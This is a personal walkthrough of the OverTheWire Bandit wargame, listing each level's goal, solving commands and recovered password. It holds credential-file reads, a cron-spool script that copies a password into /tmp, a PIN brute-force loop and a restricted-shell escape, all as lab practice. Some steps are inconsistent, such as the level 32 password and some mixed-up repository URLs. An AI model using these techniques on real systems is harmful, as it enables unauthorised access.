https://overthewire.org/wargames/bandit
_____________________________________________________________________________________

Bandit Level 0
Level Goal
The goal of this level is for you to log into the game using SSH.
The host to which you need to connect is bandit.labs.overthewire.org,
on port 2220. The username is bandit0 and the password is bandit0.
Once logged in, go to the Level 1 page to find out how to beat Level 1.



ssh bandit0@bandit.labs.overthewire.org -p 2220
password: bandit0
_____________________________________________________________________________________

Bandit Level 0 → Level 1
Level Goal
The password for the next level is stored in a file called readme
located in the home directory. Use this password to log into bandit1
using SSH. Whenever you find a password for a level, use SSH (on port 2220)
to log into that level and continue the game.

Commands you may need to solve this level
ls, cd, cat, file, du, find



cat readme -> boJ9jbbUNNfktd78OOpsqOltutMc3MY1

ssh bandit1@bandit.labs.overthewire.org -p 2220
password: boJ9jbbUNNfktd78OOpsqOltutMc3MY1
_____________________________________________________________________________________

Bandit Level 1 → Level 2
Level Goal
The password for the next level is stored in a file called -
located in the home directory

Commands you may need to solve this level
ls, cd, cat, file, du, find

Helpful Reading Material
Google Search for “dashed filename”



cat -> CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

ssh bandit2@bandit.labs.overthewire.org -p 2220
password: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9

_____________________________________________________________________________________

Bandit Level 2 → Level 3
Level Goal
The password for the next level is stored in a file called spaces
in this filename located in the home directory

Commands you may need to solve this level
ls, cd, cat, file, du, find
½


cat "spaces in filename" -> UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

ssh bandit3@bandit.labs.overthewire.org -p 2220
password: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK

_____________________________________________________________________________________

Bandit Level 3 → Level 4
Level Goal
The password for the next level is stored in a hidden file in the
inhere directory.

Commands you may need to solve this level
ls, cd, cat, file, du, find



cd inhere
ls -a
cat .hidden -> pIwrPrtPN36QITSp3EQaw936yaFoFgAB

ssh bandit4@bandit.labs.overthewire.org -p 2220
password: pIwrPrtPN36QITSp3EQaw936yaFoFgAB

_____________________________________________________________________________________

Bandit Level 4 → Level 5
Level Goal
The password for the next level is stored in the only human-readable
file in the inhere directory. Tip: if your terminal is messed up, try the
“reset” command.

Commands you may need to solve this level
ls, cd, cat, file, du, find

cat ./-file07 -> koReBOKuIDDepwhWk7jZC0RTdopnAYKh

ssh bandit5@bandit.labs.overthewire.org -p 2220
password: koReBOKuIDDepwhWk7jZC0RTdopnAYKh
_____________________________________________________________________________________
Bandit Level 5 → Level 6
Level Goal
The password for the next level is stored in a file somewhere under the
inhere directory and has all of the following properties:

human-readable

1033 bytes in size
not executable
Commands you may need to solve this level
ls, cd, cat, file, du, find



find . -readable -size 1033c ! -executable -> ./maybehere07/.file2

.. means parent directory
.  means the directory itself

ls -a
cd maybehere07
ls -a
cat .file2 -> DXjZPULLxYr17uwoI01bNLQbtFemEgo7

ssh bandit6@bandit.labs.overthewire.org -p 2220
password: DXjZPULLxYr17uwoI01bNLQbtFemEgo7

_____________________________________________________________________________________

Bandit Level 6 → Level 7
Level Goal
The password for the next level is stored somewhere on the server and has
all of the following properties:

owned by user bandit7
owned by group bandit6
33 bytes in size
Commands you may need to solve this level
ls, cd, cat, file, du, find, grep



find / -user bandit7 -group bandit6 -size 33c ->  many folder without permission,
                                                  /var/lib/dpkg/info/bandit7.password
cat /var/lib/dpkg/info/bandit7.password -> HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

ssh bandit7@bandit.labs.overthewire.org -p 2220
password: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs

_____________________________________________________________________________________
Bandit Level 7 → Level 8
Level Goal
The password for the next level is stored in the file data.txt next to the
word millionth

Commands you may need to solve this level
grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd


grep millionth data.txt -> millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV

ssh bandit8@bandit.labs.overthewire.org -p 2220
password: cvX2JJa4CFALtqS87jk27qwqGhBM9plV

_____________________________________________________________________________________

Bandit Level 8 → Level 9
Level Goal
The password for the next level is stored in the file data.txt and is the
only line of text that occurs only once

Commands you may need to solve this level
grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd


sort data.txt | uniq -u -> UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

ssh bandit9@bandit.labs.overthewire.org -p 2220
password: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR

_____________________________________________________________________________________
Bandit Level 9 → Level 10
Level Goal
The password for the next level is stored in the file data.txt in one of
the few human-readable strings, beginning with several ‘=’ characters.

Commands you may need to solve this level
grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd


grep -a === data.txt -> lots of binary shit, ===== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
ssh bandit10@bandit.labs.overthewire.org -p 2220
password: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk

_____________________________________________________________________________________

Bandit Level 10 → Level 11
Level Goal
The password for the next level is stored in the file data.txt,
which contains base64 encoded data

Commands you may need to solve this level
grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd


base64 -d data.txt -> IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

ssh bandit11@bandit.labs.overthewire.org -p 2220
password: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR

_____________________________________________________________________________________

Bandit Level 11 → Level 12
Level Goal
The password for the next level is stored in the file data.txt,
where all lowercase (a-z) and uppercase (A-Z) letters have been
rotated by 13 positions

Commands you may need to solve this level
grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd

Helpful Reading Material
  Rot13 on Wikipedia


cat data.txt | tr A-Za-z N-ZA-Mn-za-m -> 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

ssh bandit12@bandit.labs.overthewire.org -p 2220
password: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu

_____________________________________________________________________________________

Bandit Level 12 → Level 13
Level Goal
The password for the next level is stored in the file data.txt,
which is a hexdump of a file that has been repeatedly compressed.
For this level it may be useful to create a directory under /tmp
in which you can work using mkdir. For example: mkdir /tmp/myname123.
Then copy the datafile using cp, and rename it using mv (read the manpages!)

Commands you may need to solve this level
grep, sort, uniq, strings, base64, tr, tar, gzip, bzip2, xxd, mkdir, cp, mv, file

Helpful Reading Material
Hex dump on Wikipedia




xxd -r data.txt hex_reverse         (reverse the hex dump)
file hex_reverse                    (see what kind of file it is)
->  hex_reverse: gzip compressed data, was "data2.bin"
mv hex_reverse hex_reverse.gz       (rename the file to gz)
gzip -d hex_reverse.gz              (decompress)
file hex_reverse -> hex_reverse: bzip2 compressed data, block size = 900k
mv hex_reverse hex_reverse.bz2      (rename the file to bz2)
bzip2 -d -9 hex_reverse.bz2         (decompress)
file hex_reverse ->  hex_reverse: gzip compressed
mv hex_reverse hex_reverse.gz
gzip -d hex_reverse.gz
file hex_reverse -> POSIX tar archive
tar xf hex_reverse.tar -> data5.bin
file data5.bin -> TAR
mv data5.bin data5.tar
tar xf data5.tar -> data6.bin

...... more of the same, decompress many times .....

data8 -> 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

ssh bandit13@bandit.labs.overthewire.org -p 2220
password: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL

_____________________________________________________________________________________

Bandit Level 13 → Level 14
Level Goal
The password for the next level is stored in /etc/bandit_pass/bandit14 and
can only be read by user bandit14. For this level, you don’t get the next
password, but you get a private SSH key that can be used to log into the
next level. Note: localhost is a hostname that refers to the machine you
are working on

Commands you may need to solve this level
ssh, telnet, nc, openssl, s_client, nmap

Helpful Reading Material
SSH/OpenSSH/Keys


ls -> sshkey.private
ssh bandit14@localhost -i sshkey.private
cat /etc/bandit_pass/bandit14 -> 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e


ssh bandit14@bandit.labs.overthewire.org -p 2220
password: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
_____________________________________________________________________________________

Bandit Level 14 → Level 15
Level Goal
The password for the next level can be retrieved by submitting the
password of the current level to port 30000 on localhost.

Commands you may need to solve this level
ssh, telnet, nc, openssl, s_client, nmap


nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
->
  Correct!
  BfMYroe26WYalil77FoDi9qh59eK5xNr

ssh bandit15@bandit.labs.overthewire.org -p 2220
password: BfMYroe26WYalil77FoDi9qh59eK5xNr
_____________________________________________________________________________________

Bandit Level 15 → Level 16
Level Goal
The password for the next level can be retrieved by submitting the
password of the current level to port 30001 on localhost
using SSL encryption.

Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”?
Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage.
Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that
command…

Commands you may need to solve this level
ssh, telnet, nc, openssl, s_client, nmap


openssl s_client -connect localhost:30001
BfMYroe26WYalil77FoDi9qh59eK5xNr
->
  Correct!
  cluFn7wTiGryunymYOu4RcffSxQluehd


ssh bandit16@bandit.labs.overthewire.org -p 2220
password: cluFn7wTiGryunymYOu4RcffSxQluehd
_____________________________________________________________________________________

Bandit Level 16 → Level 17
Level Goal
The credentials for the next level can be retrieved by submitting
the password of the current level to a port on localhost in the
range 31000 to 32000. First find out which of these ports have a
server listening on them. Then find out which of those speak SSL
and which don’t. There is only 1 server that will give the next credentials,
the others will simply send back to you whatever you send to it.

Commands you may need to solve this level
ssh, telnet, nc, openssl, s_client, nmap

Helpful Reading Material
Port scanner on Wikipedia


nmap -sV localhost -p 31000-32000
->
  PORT      STATE SERVICE     VERSION
  31518/tcp open  ssl/echo
  31790/tcp open  ssl/unknown

openssl s_client -connect localhost:31790
cluFn7wTiGryunymYOu4RcffSxQluehd
->
  Correct!
  -----BEGIN RSA PRIVATE KEY-----
  MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
  imZzeyGC0gtZPGu...
  ......
  .....
  -----END RSA PRIVATE KEY-----

mkdir /tmp/3434
touch /tmp/3434/pvt.key
nano /tmp/3434/pvt.key        insert key and save it.
ssh bandit17@localhost -i /tmp/3434/pvt.key
->
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  @         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  Permissions 0644 for '/tmp/3434/pvt.key' are too open.
  It is required that your private key files are NOT accessible by others.
  This private key will be ignored.
  Load key "/tmp/3434/pvt.key": bad permissions

cd /tmp/3434
ls -l -> -rw-r--r-- 1 bandit16 root 1675 Feb 27 19:56 pvt.key

Wikipedia chmod : 3 numbers: user, group, other.
The file should not be accessible by others so: chmod 700

chmod 700 pvt.key
ls -l -> -rwx------ 1 bandit16 root 1675 Feb 27 19:56 pvt.key
ssh bandit17@localhost -i /tmp/3434/pvt.key -> connected



we never found the password so:
ssh bandit16@bandit.labs.overthewire.org -p 2220
password: cluFn7wTiGryunymYOu4RcffSxQluehd
ssh bandit17@localhost -i /tmp/3434/pvt.key

_____________________________________________________________________________________

Bandit Level 17 → Level 18
Level Goal
There are 2 files in the homedirectory: passwords.old and passwords.new.
The password for the next level is in passwords.new and is the only line
that has been changed between passwords.old and passwords.new

NOTE: if you have solved this level and see ‘Byebye!’ when trying to log
into bandit18, this is related to the next level, bandit19

Commands you may need to solve this level
cat, grep, ls, diff


diff passwords.old passwords.new -> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd

ssh bandit18@bandit.labs.overthewire.org -p 2220
password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
_____________________________________________________________________________________

Bandit Level 18 → Level 19
Level Goal
The password for the next level is stored in a file readme in the homedirectory.
Unfortunately, someone has modified .bashrc to log you out when you log
in with SSH.

Commands you may need to solve this level
ssh, ls, cat

ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
-> IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x

ssh bandit19@bandit.labs.overthewire.org -p 2220
password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
_____________________________________________________________________________________

Bandit Level 19 → Level 20
Level Goal
To gain access to the next level, you should use the setuid binary in the
homedirectory. Execute it without arguments to find out how to use it.
The password for this level can be found in the usual
place (/etc/bandit_pass), after you have used the setuid binary.

Helpful Reading Material
setuid on Wikipedia


file bandit20-do -> setuid ELF 32-bit LSB executable

Wikipedia setuid: allow users to run an executable with the
permissions of the executable's owner or group respectively and
to change behaviour in directories

We can run commands as user bandit20.

./bandit20-do ls /etc/bandit_pass/ ->
  bandit0   bandit12  bandit16  bandit2	bandit23  bandit27  bandit30  bandit4  bandit8
  bandit1   bandit13  bandit17  bandit20	bandit24  bandit28  bandit31  bandit5  bandit9
  bandit10  bandit14  bandit18  bandit21	bandit25  bandit29  bandit32  bandit6
  bandit11  bandit15  bandit19  bandit22	bandit26  bandit3   bandit33  bandit7

./bandit20-do cat /etc/bandit_pass/bandit20 -> GbKksEFF4yrVs6il55v6gwY5aVje5f0j

ssh bandit20@bandit.labs.overthewire.org -p 2220
password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
_____________________________________________________________________________________

Bandit Level 20 → Level 21
Level Goal
There is a setuid binary in the homedirectory that does the following:
it makes a connection to localhost on the port you specify as a
commandline argument. It then reads a line of text from the connection
and compares it to the password in the previous level (bandit20).
If the password is correct, it will transmit the password for the next
level (bandit21).

NOTE: Try connecting to your own network daemon to see if it works
as you think

Commands you may need to solve this level
ssh, nc, cat, bash, screen, tmux, Unix ‘job control’
(bg, fg, jobs, &, CTRL-Z, …)


listener that echo the old password:
echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -l -p 4040

new terminal:
./suconnect 4040 ->
  Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
  Password matches, sending next password

listener terminal:
-> gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

ssh bandit22@bandit.labs.overthewire.org -p 2220
password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
_____________________________________________________________________________________

Bandit Level 21 → Level 22
Level Goal
A program is running automatically at regular intervals from cron, the
time-based job scheduler. Look in /etc/cron.d/ for the configuration and
see what command is being executed.

Commands you may need to solve this level
cron, crontab, crontab(5) (use “man 5 crontab” to access this)


ls /etc/cron.d -> atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
cat /etc/cron.d/cronjob_bandit22 ->
  @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
  * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

cat /usr/bin/cronjob_bandit22.sh ->
  #!/bin/bash
  chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
  cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv -> Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

ssh bandit22@bandit.labs.overthewire.org -p 2220
password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
_____________________________________________________________________________________

Bandit Level 22 → Level 23
Level Goal
A program is running automatically at regular intervals from cron,
the time-based job scheduler. Look in /etc/cron.d/ for the configuration
and see what command is being executed.

NOTE: Looking at shell scripts written by other people is a very
useful skill. The script for this level is intentionally made easy to read.
If you are having problems understanding what it does,
try executing it to see the debug information it prints.

Commands you may need to solve this level
cron, crontab, crontab(5) (use “man 5 crontab” to access this)


same as previous level ... and then something new:

cat /usr/bin/cronjob_bandit23.sh ->
  #!/bin/bash
  myname=$(whoami)
  mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
  echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
  cat /etc/bandit_pass/$myname > /tmp/$mytarget

/usr/bin/cronjob_bandit23.sh ->
  Copying passwordfile /etc/bandit_pass/bandit22 to
  /tmp/8169b67bd894ddbb4412f91573b38db3

cat /tmp/8169b67bd894ddbb4412f91573b38db3 -> Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI

this was the pw for level 22.

echo I am user bandit22 | md5sum | cut -d ' ' -f 1 ->
  8169b67bd894ddbb4412f91573b38db3

echo I am user bandit23 | md5sum | cut -d ' ' -f 1 ->
  8ca319486bfbbc3663ea0fbe81326349

cat /tmp/8ca319486bfbbc3663ea0fbe81326349 -> jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

ssh bandit23@bandit.labs.overthewire.org -p 2220
password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n

_____________________________________________________________________________________

Bandit Level 23 → Level 24
Level Goal
A program is running automatically at regular intervals from cron,
the time-based job scheduler. Look in /etc/cron.d/ for the configuration
and see what command is being executed.

NOTE: This level requires you to create your own first shell-script.
This is a very big step and you should be proud of yourself when you
beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed,
so you may want to keep a copy around…

Commands you may need to solve this level
cron, crontab, crontab(5) (use “man 5 crontab” to access this)

exact same as last level: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

cd /etc/cron.d/

ls -> atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24

cat cronjob_bandit24 ->
  @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
  * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

cat /usr/bin/cronjob_bandit24.sh ->
  #!/bin/bash
  myname=$(whoami)
  cd /var/spool/$myname
  echo "Executing and deleting all scripts in /var/spool/$myname:"
  for i in * .*;
  do
      if [ "$i" != "." -a "$i" != ".." ];
      then
  	echo "Handling $i"
  	timeout -s 9 60 ./$i
  	rm -f ./$i
      fi
  done


every 60 seconds the above script is run.
User bandit24 executes all scripts in /var/spool/bandit24
and then deletes them.
So we create a script that copy the password into a file.

ls /etc/bandit_pass/ ->
  bandit0   bandit12  bandit16  bandit2	bandit23  bandit27  bandit30  bandit4  bandit8
  bandit1   bandit13  bandit17  bandit20	bandit24  bandit28  bandit31  bandit5  bandit9
  bandit10  bandit14  bandit18  bandit21	bandit25  bandit29  bandit32  bandit6
  bandit11  bandit15  bandit19  bandit22	bandit26  bandit3   bandit33  bandit7

cd ~
mkdir /tmp/ckn
touch /tmp/ckn/hack.sh
nano /tmp/ckn/hack.sh

#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/ckn/pw

chmod 777 /tmp/ckn/hack.sh
cp /tmp/ckn/hack.sh /var/spool/bandit24

it is not working ... because user bandit24 does not have acces to folder ckn

chmod 777 /tmp/ckn
ls /tmp/ckn -> hack.sh pw
cat /tmp/ckn/pw -> UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

ssh bandit24@bandit.labs.overthewire.org -p 2220
password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

_____________________________________________________________________________________

Bandit Level 24 → Level 25
Level Goal
A daemon is listening on port 30002 and will give you the password for
bandit25 if given the password for bandit24 and a secret numeric 4-digit
pincode. There is no way to retrieve the pincode except by going through
all of the 10000 combinations, called brute-forcing.


touch bt.sh
nano bt.sh

#!/bin/bash
for i in {0000..9999}
do
	echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done

chmod 777 bt.sh | ./bt.sh | nc localhost 30002 ->
  Wrong! Please enter the correct pincode. Try again.
  Wrong! Please enter the correct pincode. Try again.
  .....
  .....
  .....
  Wrong! Please enter the correct pincode. Try again.
  Wrong! Please enter the correct pincode. Try again.
  Wrong! Please enter the correct pincode. Try again.
  Correct!
  The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

ssh bandit25@bandit.labs.overthewire.org -p 2220
password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
_____________________________________________________________________________________

Bandit Level 25 → Level 26
Level Goal
Logging in to bandit26 from bandit25 should be fairly easy…
The shell for user bandit26 is not /bin/bash, but something else.
Find out what it is, how it works and how to break out of it.

Commands you may need to solve this level
ssh, cat, more, vi, ls, id, pwd


ls -> bandit26.sshkey
ssh bandit26@localhost -i bandit26.sshkey -> Connection to localhost closed.

we are logged out because bandit26 does not use bash.

/etc/passwd file stores essential information,
which required during login.
Tt stores user account information in a plain text file.
It contains a list of the system’s accounts

cat /etc/passwd | grep bandit26 ->
  bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

cat /usr/bin/showtext ->
  #!/bin/sh
  export TERM=linux
  more ~/text.txt
  exit 0

this is crazy - google is your friend:

but basically resize your terminal so more is showing when you try to login.

press v to start vim

:e /etc/bandit_pass/bandit26 -> 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

ssh bandit26@bandit.labs.overthewire.org -p 2220
password: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
_____________________________________________________________________________________

Bandit Level 26 → Level 27
Level Goal
Good job getting a shell! Now hurry and grab the password for bandit27!

Commands you may need to solve this level

:set shell=/bin/bash
:shell
./bandit27-do cat /etc/bandit_pass/bandit27 -> 3ba3118a22e93127a4ed485be72ef5ea

ssh bandit27@bandit.labs.overthewire.org -p 2220
password: 3ba3118a22e93127a4ed485be72ef5ea
_____________________________________________________________________________________

Bandit Level 27 → Level 28
Level Goal
There is a git repository at
ssh://bandit27-git@localhost/home/bandit27-git/repo.
The password for the user bandit27-git is the same as for the user bandit27.
Clone the repository and find the password for the next level.



cd /tmp/koll
git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
cat repo/readme -> 0ef186ac70e04ea33b4c1853d2526fa2

ssh bandit28@bandit.labs.overthewire.org -p 2220
password: 0ef186ac70e04ea33b4c1853d2526fa2
_____________________________________________________________________________________

Bandit Level 28 → Level 29
Level Goal
There is a git repository at
ssh://bandit28-git@localhost/home/bandit28-git/repo.
The password for the user bandit28-git is the same as for the user bandit28.
Clone the repository and find the password for the next level.


cd /tmp/koll
git clone ssh://bandit29-git@localhost/home/bandit28-git/repo
cat README.md -> password: xxxxxxxxxxxxx
git log -> fix info leak
git checkout 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
cat README.md -> - password: bbc96594b4e001778eee9975372716b2

ssh bandit29@bandit.labs.overthewire.org -p 2220
password: bbc96594b4e001778eee9975372716b2
_____________________________________________________________________________________

Bandit Level 29 → Level 30
Level Goal
There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo.
The password for the user bandit29-git is the same as for the user bandit29.

Clone the repository and find the password for the next level.

Commands you may need to solve this level
git


cd /tmp/koll
git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
cat README.md -> password: pw is not in prod.
git branch --a -> HEAD, dev, master.
git checkout dev
cat README.md -> - password: 5b90576bedb2cc04c86a9e924ce42faf

ssh bandit30@bandit.labs.overthewire.org -p 2220
password: 5b90576bedb2cc04c86a9e924ce42faf
_____________________________________________________________________________________

Bandit Level 30 → Level 31
Level Goal
There is a git repository at
ssh://bandit30-git@localhost/home/bandit30-git/repo.
The password for the user bandit30-git is the same as for the user bandit30.

Clone the repository and find the password for the next level.

Commands you may need to solve this level
git

git tag -l -> secret
git show secret -> 47e603bb428404d265f59c42920d81e5

ssh bandit31@bandit.labs.overthewire.org -p 2220
password: 47e603bb428404d265f59c42920d81e5
_____________________________________________________________________________________

Bandit Level 31 → Level 32
Level Goal
There is a git repository at
ssh://bandit31-git@localhost/home/bandit31-git/repo.
The password for the user bandit31-git is the same as for the user bandit31.

Clone the repository and find the password for the next level.

Commands you may need to solve this level
git

ls -al -> README.md, .gitignore
cat README -> create file key.text "let me in"
cat .gitignore ->
echo "let me in" > key.txt
git add .
git commit -m "added key file"
nano .gitignore and then remove *.txt line.
git add .
git commit -m "fixed .gitignore"
git push -> 56a9bf19c63d650ce78e6ec0354ee45e

ssh bandit32@bandit.labs.overthewire.org -p 2220
password: 56a9bf19c63d650ce78e6ec0354ee45e
_____________________________________________________________________________________

Bandit Level 32 → Level 33
After all this git stuff its time for another escape. Good luck!

Commands you may need to solve this level
sh, man

ssh bandit33@bandit.labs.overthewire.org -p 2220
password: 0ef186ac70e04ea33b4c1853d2526fa2
_____________________________________________________________________________________

Bandit Level 33 → Level 34
At this moment, level 34 does not exist yet.

_____________________________________________________________________________________
